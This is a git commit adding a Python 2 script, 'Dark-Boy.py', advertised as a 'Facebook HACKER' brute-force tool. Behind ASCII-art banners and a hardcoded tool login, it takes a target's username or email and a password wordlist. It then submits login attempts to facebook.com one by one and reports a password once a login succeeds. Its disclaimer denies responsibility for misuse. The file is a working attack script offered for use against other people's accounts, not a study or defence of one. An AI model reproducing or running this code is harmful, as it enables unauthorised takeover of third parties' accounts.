3da34e772d6033792703bb71f5df491943596556
bdblackforceteam <103266577+bdblackforceteam@users.noreply.github.com>
2022-06-01 21:13:25 +0600

    Add files via upload

---
+++ Dark-Boy.py
@@ -0,0 +1,198 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+#CODER : It's Ifad
+#FACEBOOK : Ifad Ibrahim
+#FACEBOOK ACCOUNT : https://facebook.com/ifad.ibrahim.8        
+        
+        #############################################
+        #                                           #
+        #    FACEBOOK BRUTFORCE BY, It's Ifad✔ #
+        #    Facebook Contact: https://www.facebook.com/ifad.ibrahim.8               #
+        #                                           #
+        #############################################
+
+
+import time
+import os
+
+os.system('clear')
+time.sleep(0.5)
+try:
+    import mechanize
+except ModuleNotFoundError:
+    print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'
+    exit()
+print """ 
+
+     \033[1;92m 
+   \033[1;92m ██████╗░░█████╗░██████╗░██╗░░██╗
+   \033[1;92m ██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
+   \033[1;92m ██║░░██║███████║██████╔╝█████═╝░
+   \033[1;92m ██║░░██║██╔══██║██╔══██╗██╔═██╗░
+   \033[1;92m ██████╔╝██║░░██║██║░░██║██║░╚██╗
+   \033[1;92m ╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝
+
+   \033[1;92m ██████╗░░█████╗░██╗░░░██╗
+   \033[1;92m ██╔══██╗██╔══██╗╚██╗░██╔╝
+   \033[1;92m ██████╦╝██║░░██║░╚████╔╝░
+   \033[1;92m ██╔══██╗██║░░██║░░╚██╔╝░░
+   \033[1;92m ██████╦╝╚█████╔╝░░░██║░░░
+   \033[1;92m ╚═════╝░░╚════╝░░░░╚═╝░░░
+   
+   
+  \033[1;96m AUTHOR: It's Ifad✔
+  \033[1;94m FACEBOOK: Ifad Ibrahim
+  \033[1;93m FACEBOOK PAGE: https://www.facebook.com/ifad.ibrahim.8
+"""
+CorrectUsername = "DARK"
+CorrectPassword = "BOY"
+loop = 'true'
+while (loop == 'true'):
+    username = raw_input("\033[1;92m \x1b[1;93mTOOL USERNAME \x1b[1;96m>>>> ")
+    if (username == CorrectUsername):
+    	password = raw_input("\033[1;92m \x1b[1;93mTOOL PASSWORD \x1b[1;96m>>>> ")
+        if (password == CorrectPassword):
+            print "Logged in successfully as DARK BOY" 
+            loop = 'false'
+            os.system('xdg-open https://www.facebook.com/ifad.ibrahim.8')
+        else:
+            print "Wrong Password"
+            os.system('xdg-open https://www.facebook.com/ifad.ibrahim.8')
+    else:
+        print "Wrong Username"
+        os.system('xdg-open https://www.facebook.com/ifad.ibrahim.8')
+time.sleep(0.5)
+print """ 
+  \033[1;92m ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+   \033[1;92m ░░░░░████░░░░░░░░░░░░░░░████░░░░░
+   \033[1;92m ░░░░███░░░░░░░░░░░░░░░░░░░███░░░░
+   \033[1;92m ░░░███░░░░░░░░░░░░░░░░░░░░░███░░░
+   \033[1;92m ░░███░░░░░░░░░░░░░░░░░░░░░░░███░░
+   \033[1;92m ░███░░░░░░░░░░░░░░░░░░░░░░░░░███░
+   \033[1;92m ████░░░░░░░░░░░░░░░░░░░░░░░░░████
+   \033[1;92m ████░░░░░░░░░░░░░░░░░░░░░░░░░████
+   \033[1;92m ██████░░░░░░░███████░░░░░░░██████
+   \033[1;92m █████████████████████████████████
+   \033[1;92m █████████████████████████████████
+   \033[1;92m ░███████████████████████████████░
+   \033[1;92m ░░████░███████████████████░████░░
+   \033[1;92m ░░░░░░░███▀███████████▀███░░░░░░░
+   \033[1;92m ░░░░░░████──▀███████▀──████░░░░░░
+   \033[1;92m ░░░░░░█████───█████───█████░░░░░░
+   \033[1;92m ░░░░░░███████▄█████▄███████░░░░░░
+   \033[1;92m ░░░░░░░███████████████████░░░░░░░
+   \033[1;92m ░░░░░░░░█████████████████░░░░░░░░
+   \033[1;92m ░░░░░░░░░███████████████░░░░░░░░░
+   \033[1;92m ░░░░░░░░░░█████████████░░░░░░░░░░
+   \033[1;92m ░░░░░░░░░░░███████████░░░░░░░░░░░
+   \033[1;92m ░░░░░░░░░░███──▀▀▀──███░░░░░░░░░░
+   \033[1;92m ░░░░░░░░░░███─█████─███░░░░░░░░░░
+   \033[1;92m ░░░░░░░░░░░███─███─███░░░░░░░░░░░
+   \033[1;92m ░░░░░░░░░░░░█████████░░░░░░░░░░░░
+   \033[1;92m ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+
+   \033[1;91m
+   \033[1;91m███████╗██████╗░
+   \033[1;91m██╔════╝██╔══██╗
+   \033[1;91m█████╗░░██████╦╝
+   \033[1;91m██╔══╝░░██╔══██╗
+   \033[1;91m██║░░░░░██████╦╝
+   \033[1;91m╚═╝░░░░░╚═════╝░
+
+   \033[1;91m██████╗░██████╗░██╗░░░██╗████████╗███████╗
+   \033[1;91m██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝
+   \033[1;91m██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░
+   \033[1;91m██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░
+   \033[1;91m██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗
+   \033[1;91m╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝
+  
+  \033[1;93m AUTHOR: It's Ifad✔
+\033[1;94m FACEBOOK: Ifad Ibrahim
+\033[1;93m FACEBOOK CONTACT:https://www.facebook.com/ifad.ibrahim.8
+"""
+user = raw_input('[✪] Facebook Target Username/ID/Email ::: ')
+time.sleep(0.8)
+wrdlstFileName = raw_input('\n[⊕] Wordlist Type (ENTER YOUR WORDLIST) ::: ')
+try:
+    wordlist = open(wrdlstFileName, 'r')
+except FileNotFoundError:
+    print ('\n[!] File Not Found!')
+    exit()
+
+print """
+            \033[1;94m ───────────▄▄▄▄▄▄▄▄▄───────────
+            \033[1;94m ────────▄█████████████▄────────
+            \033[1;94m █████──█████████████████──█████
+            \033[1;94m ▐████▌─▀███▄───────▄███▀─▐████▌
+            \033[1;94m ─█████▄──▀███▄───▄███▀──▄█████─
+            \033[1;94m ─▐██▀███▄──▀███▄███▀──▄███▀██▌─
+            \033[1;94m ──███▄▀███▄──▀███▀──▄███▀▄███──
+            \033[1;91m ──▐█▄▀█▄▀███─▄─▀─▄─███▀▄█▀▄█▌──
+            \033[1;91m ───███▄▀█▄██─██▄██─██▄█▀▄███───
+            \033[1;91m ────▀███▄▀██─█████─██▀▄███▀────
+            \033[1;91m ───█▄─▀█████─█████─█████▀─▄█───
+            \033[1;91m ───███────────███────────███───
+            \033[1;91m ───███▄────▄█─███─█▄────▄███───
+            \033[1;91m ───█████─▄███─███─███▄─█████───
+            \033[1;91m ───█████─████─███─████─█████───
+            \033[1;92m ───█████─████─███─████─█████───
+            \033[1;92m ───█████─████─███─████─█████───
+            \033[1;92m ───█████─████▄▄▄▄▄████─█████───
+            \033[1;92m ────▀███─█████████████─███▀────
+            \033[1;92m ──────▀█─███─▄▄▄▄▄─███─█▀──────
+            \033[1;92m ─────────▀█▌▐█████▌▐█▀─────────
+            \033[1;92m ────────────███████────────────
+
+
+\033[1;94m     +===============================================+
+\033[1;92m     |.............   Facebook HACKER   .............|
+\033[1;92m     +-----------------------------------------------+
+\033[1;92m     |         #Author: It's Ifad                            | 
+\033[1;91m     |	       Version:  3.0                            |
+ \033[1;92m    |   https://www.facebook.com/ifad.ibrahim.8       |   
+\033[1;91m    	+===============================================+
+\033[1;96m      |..............  fb-Terget  ...............|
+     +-----------------------------------------------+\n\n
+""" 
+time.sleep(0.8)
+print '\n\nCracking '+user+' Now...'
+
+time.sleep(1)
+print '\nIM NOT RESPONSIBLE FOR ANY MISS USE Dark_boy\n'
+for password in wordlist:
+    if password == '' or password == ' ':
+        pass
+    else:
+        try:
+            browser = mechanize.Browser()
+            browser.set_handle_robots(False)
+            browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
+            fb = browser.open('https://facebook.com')
+            dos = open('Facebook-Log.txt', 'w+')
+            browser.select_form(nr=0)
+            browser.form['email'] = user
+            browser.form['pass'] = password
+            browser.method = 'POST'
+            browser.submit()
+            dos.write(browser.open('https://facebook.com').read())
+            dos.seek(0)
+            text = dos.read().decode('UTF-8')
+            if text.find('home_icon', 0, len(text)) != -1:
+                print '\033[1;96m[✔] Password Found >>>>➤ '+password 
+                dos.close()
+                os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
+                exit()
+            else:
+                print "\033[1;96m[✘] Wrong Password >>>➤ "+str(password)
+        except KeyboardInterrupt:
+            print '\n#############################################\n   Exiting..'
+            dos.close()
+            os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
+            exit()
+
+time.sleep(1)
+print 'Sorry, none of the passswords in your wordlist is right.'
+time.sleep(0.8)
+dos.close()
+os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
+exit()
